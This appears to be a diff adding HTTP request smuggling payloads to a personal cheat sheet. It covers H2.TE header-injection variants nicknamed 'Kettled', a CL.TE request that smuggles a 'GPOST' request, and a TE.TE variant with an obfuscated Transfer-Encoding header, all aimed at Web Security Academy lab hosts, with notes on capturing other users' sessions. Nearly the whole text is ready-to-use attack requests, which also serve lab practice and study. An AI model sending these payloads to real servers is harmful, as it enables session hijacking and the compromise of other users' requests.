@@ -147,6 +147,77 @@ x=1
 
 
 
+
+#KETTLED (H2.TE)
+REQUEST HEADER:
+name: 
+foo
+
+Value:
+bar\r\n
+Transfer-Encoding: chunked
+
+
+Body:
+0
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE;
+Content-Length: 800
+
+search=x
+
+#Change CL value, until get Session
+----------------------------------------------------
+#KETTLED (H2.TE/Dual Path)
+REQUEST HEADER:
+name: 
+foo
+
+value:
+bar\r\n
+\r\n
+GET /x HTTP/1.1\r\n
+Host: YOUR-LAB-ID.web-security-academy.net
+
+#Repeat until get 302
+
+---------------------------------------------------
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+--------------------------------------------------------
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+
+
 Bug Bounty Report
 https://hackerone.com/reports/726773
 ```
